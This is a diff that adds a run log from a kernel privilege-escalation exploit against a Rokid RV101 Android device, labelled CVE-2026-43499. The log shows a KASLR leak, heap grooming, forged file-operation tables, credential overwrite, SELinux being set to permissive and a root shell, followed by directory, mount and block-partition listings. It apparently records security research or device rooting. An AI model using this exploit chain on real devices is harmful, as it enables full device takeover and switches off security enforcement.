@@ -1,0 +1,697 @@
+=== GHOSTLOCK RUNLOG ===
+tag=w2 version=v960 ts=143215
+--- host time ---
+Sat Aug 22 02:32:15 PM CST 2026
+--- uptime before ---
+ 14:32:15 up 1 min,  0 users,  load average: 0.87, 0.35, 0.13
+--- loadavg before ---
+0.80 0.34 0.12 1/1271 3004
+--- nr_threads (field 4 total) ---
+running/total=1/1286
+--- meminfo head ---
+MemTotal:        1816600 kB
+MemFree:          107224 kB
+MemAvailable:     846804 kB
+Buffers:            5008 kB
+--- getenforce before ---
+Enforcing
+--- device binary sha1 ---
+4eeb98171ed21113130d5f2676a0bd283c8f56c7  /data/local/tmp/ghostlock_rv101
+--- local binary sha1 ---
+4eeb98171ed21113130d5f2676a0bd283c8f56c7  /home/kali/rokid_root/source_code/ghostlock_rv101/build/ghostlock_rv101
+--- environment ---
+--- command ---
+GL_PURGE_CNT=0\ GL_TAIL_KILLS=16\ GL_DUMMY_KILLS=0\ W2_ATTEMPTS=1\ /data/local/tmp/ghostlock_rv101 
+=== RUN OUTPUT ===
+[+] ghostlock_rv101 v9.60 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3039 uid=2000 euid=2000 gid=2000
+[*] [T+76292ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffd93c22ac0c slide=0x0000001932600000
+[*] printk_formats: "Function call interrupts" -> 0xffffffd93c2ca100 slide=0x0000001932600000
+[+] KASLR: slide=0x0000001932600000 base=0xffffffd93a600000 (2 anchors)
+[*] FOPS install attempt 1/3
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000006c4d05dab0 (t=9342, ratio=1868)
+[*]   collision[2]: 0000006c4d894c68 (t=9404, ratio=1880)
+[*]   collision[3]: 0000006c4d92f140 (t=9321, ratio=1864)
+[*] kernelsnitch: top times: 9404 9342 9321 19 19 19 19 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11112 mm=FOUND
+[*] kernelsnitch: elapsed 1874ms mm=ffffff8029353c00
+[*] leaked mm=ffffff8029353c00 slab base=ffffff8029350000
+[*] v9.14 settle[settle]: 33 rounds, o2=1353 objs=781 (quiet=20)
+[*] v9.10 gate: mm slabs 85 -> 84 objs 781 -> 683 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 1 -> 2328 across full sequence (gate window 85 -> 2328, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8029351608 value=ffffff8029351500 mode=5 page=ffffff8029350000 fake_lock=ffffff8029350e00 fake_w0=ffffff8029351000 fake_task=ffffff8029351200 in=0000000000000000 out1=ffffff8029351600 out2=ffffffd93cfbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8029351200 ex3=ffffff8029350e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=9002
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=9002
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=9002
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=9002
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=9002
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffd93b81ab88 read=0xffffffd93b839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[1] n=15872 llseek=0xffffffd93b81ab88 read=0xffffffd93b839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[2] n=15872 llseek=0xffffffd93b81ab88 read=0xffffffd93b839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 6, llseek=0xffffffd93cfbcbc0 exp=0xffffffd93cfbcbc0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd93c7ebd08 len=8 -> r=8 errno=0
+[*] configfs probe: init_task.tasks.next = 0xffffff8001033b88
+[+] fake_fops installed into ashmem_misc.fops
+[*] [T+97993ms] FOPS installed
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd93c7ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd93c7ebd10 len=8 -> r=8 errno=0
+[*] round 1/1: child=9005 prev=0xffffff803b724dc8 prev2=0xffffff803b724dc8 stable=1 task=0xffffff803b724900
+[*]   cred_slot=0xffffff803b725080 real_cred_slot=0xffffff803b725078 init_cred=0xffffffd93c802058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
+[*]   collision[1]: 0000006c4acda668 (t=9025, ratio=1805)
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[2]: 0000006c4b1c7dd0 (t=8962, ratio=1792)
+[*]   collision[3]: 0000006c4bf0c7f8 (t=9123, ratio=1824)
+[*] kernelsnitch: top times: 9123 9025 8962 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11871 mm=FOUND
+[*] kernelsnitch: elapsed 2539ms mm=ffffff802e8af0c0
+[*] leaked mm=ffffff802e8af0c0 slab base=ffffff802e8ac000
+[*] v9.14 settle[settle]: 29 rounds, o2=2314 objs=1298 (quiet=20)
+[*] v9.10 gate: mm slabs 114 -> 113 objs 1298 -> 1184 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 25 -> 3843 across full sequence (gate window 114 -> 3843, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffd93c802060 value=ffffff802e8ad500 mode=5 page=ffffff802e8ac000 fake_lock=ffffff802e8ace00 fake_w0=ffffff802e8ad000 fake_task=ffffff802e8ad200 in=0000000000000000 out1=ffffffd93c802058 out2=ffffff803b725080 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff802e8ad200 ex3=ffffff802e8ace00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=14374
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=14374
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=14374
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=14374
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=14374
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[1]: 0000006c48fe5ec0 (t=9099, ratio=1819)
+[*]   collision[2]: 0000006c49590c18 (t=9112, ratio=1822)
+[*]   collision[3]: 0000006c49d087d8 (t=9152, ratio=1830)
+[*] kernelsnitch: top times: 9152 9112 9099 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10000 mm=FOUND
+[*] kernelsnitch: elapsed 2248ms mm=ffffff802130cb40
+[*] leaked mm=ffffff802130cb40 slab base=ffffff802130c000
+[*] v9.14 settle[settle]: 61 rounds, o2=2732 objs=1345 (quiet=10)
+[*] v9.10 gate: mm slabs 117 -> 117 objs 1345 -> 1229 (dip=0 calm=3604)
+[*] v9.12 reclaim: o2 1 -> 3311 across full sequence (gate window 117 -> 3311, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffd93c802060 value=ffffff802130d500 mode=5 page=ffffff802130c000 fake_lock=ffffff802130ce00 fake_w0=ffffff802130d000 fake_task=ffffff802130d200 in=0000000000000000 out1=ffffffd93c802058 out2=ffffff803b725078 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff802130d200 ex3=ffffff802130ce00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=19738
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=19738
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=19738
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=19738
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=19738
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
+[+] child is root!
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[+] GHOSTLOCK ROOT: uid=0 gid=0
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+Permissive
+[+] dropping to root shell
+[*] [T+163481ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
+/system/bin/sh: <stdin>[2]: who: inaccessible or not found
+root
+total 163
+drwxrwx--x 49 system   system    4096 2026-08-22 14:31 .
+drwxr-xr-x 26 root     root      4096 2009-01-01 08:00 ..
+drwx------  2 root     root      3452 1970-01-08 22:21 adb
+drwxrwxr-x  2 system   system    3452 2026-05-03 20:53 anr
+drwxr-xr-x  8 root     system    3452 1970-01-08 22:21 apex
+drwxrwx--x  6 system   system    3452 2026-08-16 23:27 app
+drwx------  2 root     root      3452 1970-01-08 22:21 app-asec
+drwxrwx--x  2 system   system    3452 1970-01-08 22:21 app-ephemeral
+drwxrwx--x  2 system   system    3452 1970-01-08 22:21 app-lib
+drwxrwx--x  2 system   system    3452 1970-01-08 22:21 app-private
+drwxr-x--x  2 system   system    3452 1970-01-08 22:21 app-staging
+drwx------  2 system   system    3452 1970-01-08 22:21 backup
+drwxr-xr-x  2 shell    shell     3452 1970-01-08 22:21 bootchart
+drwxrwx---  5 system   cache     3452 1970-01-08 22:21 cache
+drwxrwx--x  4 root     root      3452 1970-01-08 22:21 dalvik-cache
+drwxrwx--x 98 system   system   20480 2026-08-16 23:12 data
+drwxrwx---  3 drm      drm       3452 2025-12-12 19:53 drm
+drwxrwx--x  4 root     root      3452 1970-01-08 22:21 fonts
+drwx------  5 root     root      3452 1970-01-08 22:21 gsi
+-rw-------  1 system   system       1 1970-06-03 04:53 gsi_persistent_data
+drwxrwx--x  2 system   system    3452 1970-01-08 22:21 incremental
+drwxr-x--x  5 root     root      3452 1970-01-08 22:21 local
+drwxrwx---  2 root     root      3452 1970-01-08 22:21 lost+found
+drwxrwx---  4 media_rw media_rw  3452 2025-12-12 19:53 media
+drwxrwx---  2 mediadrm mediadrm  3452 1970-01-08 22:21 mediadrm
+drwxrwx--t 59 system   misc      3452 2026-01-10 14:18 misc
+drwxrwx--t  3 system   misc      3452 2025-12-12 19:53 misc_ce
+drwxrwx--t  3 system   misc      3452 1970-01-08 22:21 misc_de
+drwxrwx---  3 nfc      nfc       3452 1970-01-08 22:21 nfc
+drwxrwx--x  2 root     root      3452 1970-01-08 22:21 ota
+drwxrwx---  2 system   cache     3452 1970-01-08 22:21 ota_package
+drwx------  2 system   system    3452 2026-08-22 14:31 per_boot
+drwxrwxr-x  2 system   system    3452 1970-01-08 22:21 preloads
+drwx------  2 root     root      3452 2026-08-22 14:31 property
+drwxrwx--x  2 system   system    3452 2025-12-25 23:33 resource-cache
+drwx------  2 system   system    3452 1970-01-08 22:21 rollback
+drwx------  2 system   system    3452 1970-01-08 22:21 rollback-history
+drwx------  2 system   system    3452 1970-01-08 22:21 rollback-observer
+drwxrwxr-x  2 system   system    3452 1970-01-08 22:21 server_configurable_flags
+drwx------  2 system   system    3452 1970-01-08 22:21 ss
+drwxrwxr-x 27 system   system    4096 2026-08-22 14:32 system
+drwxrwx---  3 system   system    3452 2025-12-12 19:53 system_ce
+drwxrwx---  4 system   system    3452 2025-12-19 20:02 system_de
+drwxrwx--x  2 system   system    3452 2026-08-22 14:32 tombstones
+drwx------  3 root     root      3452 1970-01-08 22:21 unencrypted
+drwx--x--x  3 system   system    3452 1970-01-08 22:21 user
+drwx--x--x  3 system   system    3452 1970-01-08 22:21 user_de
+drwxrwx--x 33 root     root      3452 1970-01-08 22:21 vendor
+drwxrwx--x  3 root     root      3452 2025-12-12 19:53 vendor_ce
+drwxrwx--x  3 root     root      3452 1970-01-08 22:21 vendor_de
+/dev/block/dm-13 on /system_ext type ext4 (ro,seclabel,relatime,discard)
+/dev/block/dm-15 on /vendor type ext4 (ro,seclabel,relatime,discard)
+/dev/block/dm-16 on /vendor_dlkm type ext4 (ro,seclabel,relatime,discard)
+/dev/block/mmcblk0p51 on /mnt/vendor/persist type ext4 (rw,seclabel,nosuid,nodev,noatime)
+/dev/block/mmcblk0p34 on /vendor/firmware_mnt type vfat (ro,context=u:object_r:firmware_file:s0,relatime,uid=1000,gid=1000,fmask=0337,dmask=0227,codepage=437,iocharset=iso8859-1,shortname=lower,errors=remount-ro)
+/dev/block/mmcblk0p36 on /vendor/dsp type ext4 (ro,seclabel,nosuid,nodev,relatime)
+/dev/block/mmcblk0p41 on /vendor/bt_firmware type vfat (ro,context=u:object_r:bt_firmware_file:s0,relatime,uid=1002,gid=3002,fmask=0337,dmask=0227,codepage=437,iocharset=iso8859-1,shortname=lower,errors=remount-ro)
+/dev/block/mmcblk0p80 on /mnt/vendor/qmcs type vfat (rw,context=u:object_r:vendor_qmcs_file:s0,nosuid,nodev,noatime,fmask=0000,dmask=0000,allow_utime=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)
+/dev/block/mmcblk0p76 on /mnt/vendor/logfs type vfat (rw,nosuid,nodev,noatime,fmask=0133,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)
+total 0
+lrwxrwxrwx 1 root   root         36 1970-06-03 04:53 bootdevice -> /dev/block/platform/soc/7c4000.sdhci
+drwxr-xr-x 2 root   root       2080 1970-06-03 04:53 by-name
+brw------- 1 root   root   254,   0 1970-06-03 04:53 dm-0
+brw------- 1 root   root   254,   1 1970-06-03 04:53 dm-1
+brw------- 1 root   root   254,  10 1970-06-03 04:53 dm-10
+brw------- 1 root   root   254,  11 1970-06-03 04:53 dm-11
+brw------- 1 root   root   254,  12 1970-06-03 04:53 dm-12
+brw------- 1 root   root   254,  13 1970-06-03 04:53 dm-13
+brw------- 1 root   root   254,  14 1970-06-03 04:53 dm-14
+brw------- 1 root   root   254,  15 1970-06-03 04:53 dm-15
+brw------- 1 root   root   254,  16 1970-06-03 04:53 dm-16
+brw------- 1 root   root   254,  17 1970-06-03 04:53 dm-17
+brw------- 1 root   root   254,  18 1970-06-03 04:53 dm-18
+brw------- 1 root   root   254,   2 1970-06-03 04:53 dm-2
+brw------- 1 root   root   254,   3 1970-06-03 04:53 dm-3
+brw------- 1 root   root   254,   4 1970-06-03 04:53 dm-4
+brw------- 1 root   root   254,   5 1970-06-03 04:53 dm-5
+brw------- 1 root   root   254,   6 1970-06-03 04:53 dm-6
+brw------- 1 root   root   254,   7 1970-06-03 04:53 dm-7
+brw------- 1 root   root   254,   8 1970-06-03 04:53 dm-8
+brw------- 1 root   root   254,   9 1970-06-03 04:53 dm-9
+brw------- 1 root   root     7,   0 1970-06-03 04:53 loop0
+brw------- 1 root   root     7,   8 1970-06-03 04:53 loop1
+brw------- 1 root   root     7,  80 1970-06-03 04:53 loop10
+brw------- 1 root   root     7,  88 1970-06-03 04:53 loop11
+brw------- 1 root   root     7,  96 1970-06-03 04:53 loop12
+brw------- 1 root   root     7, 104 1970-06-03 04:53 loop13
+brw------- 1 root   root     7, 112 1970-06-03 04:53 loop14
+brw------- 1 root   root     7, 120 1970-06-03 04:53 loop15
+brw------- 1 root   root     7,  16 1970-06-03 04:53 loop2
+brw------- 1 root   root     7,  24 1970-06-03 04:53 loop3
+brw------- 1 root   root     7,  32 1970-06-03 04:53 loop4
+brw------- 1 root   root     7,  40 1970-06-03 04:53 loop5
+brw------- 1 root   root     7,  48 1970-06-03 04:53 loop6
+brw------- 1 root   root     7,  56 1970-06-03 04:53 loop7
+brw------- 1 root   root     7,  64 1970-06-03 04:53 loop8
+brw------- 1 root   root     7,  72 1970-06-03 04:53 loop9
+drwxr-xr-x 3 root   root        440 1970-06-03 04:53 mapper
+brw------- 1 root   root   179,   0 1970-06-03 04:53 mmcblk0
+brw------- 1 root   root   179,   8 1970-06-03 04:53 mmcblk0boot0
+brw------- 1 root   root   179,  16 1970-06-03 04:53 mmcblk0boot1
+brw------- 1 root   root   179,   1 1970-06-03 04:53 mmcblk0p1
+brw------- 1 root   root   259,   2 1970-06-03 04:53 mmcblk0p10
+brw------- 1 root   root   259,   3 1970-06-03 04:53 mmcblk0p11
+brw------- 1 root   root   259,   4 1970-06-03 04:53 mmcblk0p12
+brw------- 1 root   root   259,   5 1970-06-03 04:53 mmcblk0p13
+brw------- 1 root   root   259,   6 1970-06-03 04:53 mmcblk0p14
+brw------- 1 root   root   259,   7 1970-06-03 04:53 mmcblk0p15
+brw------- 1 root   root   259,   8 1970-06-03 04:53 mmcblk0p16
+brw------- 1 root   root   259,   9 1970-06-03 04:53 mmcblk0p17
+brw------- 1 root   root   259,  10 1970-06-03 04:53 mmcblk0p18
+brw------- 1 root   root   259,  11 1970-06-03 04:53 mmcblk0p19
+brw------- 1 root   root   179,   2 1970-06-03 04:53 mmcblk0p2
+brw------- 1 root   root   259,  12 1970-06-03 04:53 mmcblk0p20
+brw------- 1 root   root   259,  13 1970-06-03 04:53 mmcblk0p21
+brw------- 1 root   root   259,  14 1970-06-03 04:53 mmcblk0p22
+brw------- 1 root   root   259,  15 1970-06-03 04:53 mmcblk0p23
+brw------- 1 root   root   259,  16 1970-06-03 04:53 mmcblk0p24
+brw------- 1 root   root   259,  17 1970-06-03 04:53 mmcblk0p25
+brw------- 1 root   root   259,  18 1970-06-03 04:53 mmcblk0p26
+brw------- 1 root   root   259,  19 1970-06-03 04:53 mmcblk0p27
+brw------- 1 root   root   259,  20 1970-06-03 04:53 mmcblk0p28
+brw------- 1 root   root   259,  21 1970-06-03 04:53 mmcblk0p29
+brw------- 1 root   root   179,   3 1970-06-03 04:53 mmcblk0p3
+brw------- 1 root   root   259,  22 1970-06-03 04:53 mmcblk0p30
+brw------- 1 root   root   259,  23 1970-06-03 04:53 mmcblk0p31
+brw------- 1 root   root   259,  24 1970-06-03 04:53 mmcblk0p32
+brw------- 1 root   root   259,  25 1970-06-03 04:53 mmcblk0p33
+brw------- 1 root   root   259,  26 1970-06-03 04:53 mmcblk0p34
+brw------- 1 root   root   259,  27 1970-06-03 04:53 mmcblk0p35
+brw------- 1 root   root   259,  28 1970-06-03 04:53 mmcblk0p36
+brw------- 1 root   root   259,  29 1970-06-03 04:53 mmcblk0p37
+brw------- 1 root   root   259,  30 1970-06-03 04:53 mmcblk0p38
+brw------- 1 root   root   259,  31 1970-06-03 04:53 mmcblk0p39
+brw------- 1 root   root   179,   4 1970-06-03 04:53 mmcblk0p4
+brw------- 1 root   root   259,  32 1970-06-03 04:53 mmcblk0p40
+brw------- 1 root   root   259,  33 1970-06-03 04:53 mmcblk0p41
+brw------- 1 root   root   259,  34 1970-06-03 04:53 mmcblk0p42
+brw------- 1 root   root   259,  35 1970-06-03 04:53 mmcblk0p43
+brw------- 1 root   root   259,  36 1970-06-03 04:53 mmcblk0p44
+brw------- 1 root   root   259,  37 1970-06-03 04:53 mmcblk0p45
+brw------- 1 root   root   259,  38 1970-06-03 04:53 mmcblk0p46
+brw------- 1 root   root   259,  39 1970-06-03 04:53 mmcblk0p47
+brw------- 1 root   root   259,  40 1970-06-03 04:53 mmcblk0p48
+brw------- 1 root   root   259,  41 1970-06-03 04:53 mmcblk0p49
+brw------- 1 root   root   179,   5 1970-06-03 04:53 mmcblk0p5
+brw------- 1 root   root   259,  42 1970-06-03 04:53 mmcblk0p50
+brw------- 1 root   root   259,  43 1970-06-03 04:53 mmcblk0p51
+brw------- 1 root   root   259,  44 1970-06-03 04:53 mmcblk0p52
+brw------- 1 root   root   259,  45 1970-06-03 04:53 mmcblk0p53
+brw------- 1 root   root   259,  46 1970-06-03 04:53 mmcblk0p54
+brw------- 1 root   root   259,  47 1970-06-03 04:53 mmcblk0p55
+brw------- 1 root   root   259,  48 1970-06-03 04:53 mmcblk0p56
+brw------- 1 root   root   259,  49 1970-06-03 04:53 mmcblk0p57
+brw------- 1 root   root   259,  50 1970-06-03 04:53 mmcblk0p58
+brw------- 1 root   root   259,  51 1970-06-03 04:53 mmcblk0p59
+brw------- 1 root   root   179,   6 1970-06-03 04:53 mmcblk0p6
+brw------- 1 root   root   259,  52 1970-06-03 04:53 mmcblk0p60
+brw------- 1 root   root   259,  53 1970-06-03 04:53 mmcblk0p61
+brw------- 1 root   root   259,  54 1970-06-03 04:53 mmcblk0p62
+brw------- 1 root   root   259,  55 1970-06-03 04:53 mmcblk0p63
+brw------- 1 root   root   259,  56 1970-06-03 04:53 mmcblk0p64
+brw------- 1 root   root   259,  57 1970-06-03 04:53 mmcblk0p65
+brw------- 1 root   root   259,  58 1970-06-03 04:53 mmcblk0p66
+brw------- 1 root   root   259,  59 1970-06-03 04:53 mmcblk0p67
+brw------- 1 system system 259,  60 1970-06-03 04:53 mmcblk0p68
+brw------- 1 root   root   259,  61 1970-06-03 04:53 mmcblk0p69
+brw------- 1 root   root   179,   7 1970-06-03 04:53 mmcblk0p7
+brw------- 1 root   root   259,  62 1970-06-03 04:53 mmcblk0p70
+brw------- 1 root   root   259,  63 1970-06-03 04:53 mmcblk0p71
+brw------- 1 root   root   259,  64 1970-06-03 04:53 mmcblk0p72
+brw------- 1 root   root   259,  65 1970-06-03 04:53 mmcblk0p73
+brw------- 1 root   root   259,  66 1970-06-03 04:53 mmcblk0p74
+brw------- 1 root   root   259,  67 1970-06-03 04:53 mmcblk0p75
+brw------- 1 root   root   259,  68 1970-06-03 04:53 mmcblk0p76
+brw------- 1 root   root   259,  69 1970-06-03 04:53 mmcblk0p77
+brw------- 1 root   root   259,  70 1970-06-03 04:53 mmcblk0p78
+brw------- 1 root   root   259,  71 1970-06-03 04:53 mmcblk0p79
+brw------- 1 root   root   259,   0 1970-06-03 04:53 mmcblk0p8
+brw------- 1 root   root   259,  72 1970-06-03 04:53 mmcblk0p80
+brw------- 1 root   root   259,  73 1970-06-03 04:53 mmcblk0p81
+brw------- 1 root   root   259,  74 1970-06-03 04:53 mmcblk0p82
+brw------- 1 root   root   259,  75 1970-06-03 04:53 mmcblk0p83
+brw------- 1 root   root   259,  76 1970-06-03 04:53 mmcblk0p84
+brw------- 1 root   root   259,  77 1970-06-03 04:53 mmcblk0p85
+brw------- 1 root   root   259,  78 1970-06-03 04:53 mmcblk0p86
+brw------- 1 root   root   259,  79 1970-06-03 04:53 mmcblk0p87
+brw------- 1 root   root   259,  80 1970-06-03 04:53 mmcblk0p88
+brw------- 1 root   root   259,  81 1970-06-03 04:53 mmcblk0p89
+brw------- 1 root   root   259,   1 1970-06-03 04:53 mmcblk0p9
+brw------- 1 root   root   259,  82 1970-06-03 04:53 mmcblk0p90
+brw------- 1 root   root   259,  83 1970-06-03 04:53 mmcblk0p91
+brw------- 1 root   root   259,  84 1970-06-03 04:53 mmcblk0p92
+brw------- 1 root   root   259,  85 1970-06-03 04:53 mmcblk0p93
+brw------- 1 root   root   259,  86 1970-06-03 04:53 mmcblk0p94
+brw------- 1 root   root   259,  87 1970-06-03 04:53 mmcblk0p95
+brw------- 1 root   root   259,  88 1970-06-03 04:53 mmcblk0p96
+brw------- 1 root   root   259,  89 1970-06-03 04:53 mmcblk0p97
+brw------- 1 root   root   259,  90 1970-06-03 04:53 mmcblk0p98
+brw------- 1 root   root   259,  91 1970-06-03 04:53 mmcblk0p99
+drwxr-xr-x 3 root   root         60 1970-06-03 04:53 platform
+brw------- 1 root   root     1,   0 1970-06-03 04:53 ram0
+brw------- 1 root   root     1,   1 1970-06-03 04:53 ram1
+brw------- 1 root   root     1,  10 1970-06-03 04:53 ram10
+brw------- 1 root   root     1,  11 1970-06-03 04:53 ram11
+brw------- 1 root   root     1,  12 1970-06-03 04:53 ram12
+brw------- 1 root   root     1,  13 1970-06-03 04:53 ram13
+brw------- 1 root   root     1,  14 1970-06-03 04:53 ram14
+brw------- 1 root   root     1,  15 1970-06-03 04:53 ram15
+brw------- 1 root   root     1,   2 1970-06-03 04:53 ram2
+brw------- 1 root   root     1,   3 1970-06-03 04:53 ram3
+brw------- 1 root   root     1,   4 1970-06-03 04:53 ram4
+brw------- 1 root   root     1,   5 1970-06-03 04:53 ram5
+brw------- 1 root   root     1,   6 1970-06-03 04:53 ram6
+brw------- 1 root   root     1,   7 1970-06-03 04:53 ram7
+brw------- 1 root   root     1,   8 1970-06-03 04:53 ram8
+brw------- 1 root   root     1,   9 1970-06-03 04:53 ram9
+drwx------ 2 root   root         40 1970-06-03 04:53 vold
+brw------- 1 root   root   253,   0 2026-08-22 14:31 zram0
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+u:r:kernel:s0
+Permissive
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+CapInh:	0000000000000000
+CapPrm:	000001ffffffffff
+CapEff:	000001ffffffffff
+CapBnd:	000001ffffffffff
+u:r:kernel:s0 drwx------ 2 root root 3452 1970-01-08 22:21 /data/adb
+total 11
+drwx------  2 root   root   3452 1970-01-08 22:21 .
+drwxrwx--x 49 system system 4096 2026-08-22 14:31 ..
+ls: /data/root_proof: No such file or directory
+-rw-rw-rw- 1 root root 0 2026-08-22 14:39 /data/root_proof
+total 0
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 abl_a -> /dev/block/mmcblk0p37
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 abl_b -> /dev/block/mmcblk0p38
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 aop_a -> /dev/block/mmcblk0p9
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 aop_b -> /dev/block/mmcblk0p10
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 aop_config_a -> /dev/block/mmcblk0p11
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 aop_config_b -> /dev/block/mmcblk0p12
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 apdp -> /dev/block/mmcblk0p71
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 bluetooth_a -> /dev/block/mmcblk0p40
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 bluetooth_b -> /dev/block/mmcblk0p41
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 boot_a -> /dev/block/mmcblk0p17
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 boot_b -> /dev/block/mmcblk0p18
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 connsec -> /dev/block/mmcblk0p89
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 cpucp_a -> /dev/block/mmcblk0p56
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 cpucp_b -> /dev/block/mmcblk0p57
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 ddr -> /dev/block/mmcblk0p39
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 devcfg_a -> /dev/block/mmcblk0p61
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 devcfg_b -> /dev/block/mmcblk0p62
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 devinfo -> /dev/block/mmcblk0p69
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 dip -> /dev/block/mmcblk0p70
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 dsp_a -> /dev/block/mmcblk0p35
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 dsp_b -> /dev/block/mmcblk0p36
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 dtbo_a -> /dev/block/mmcblk0p45
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 dtbo_b -> /dev/block/mmcblk0p46
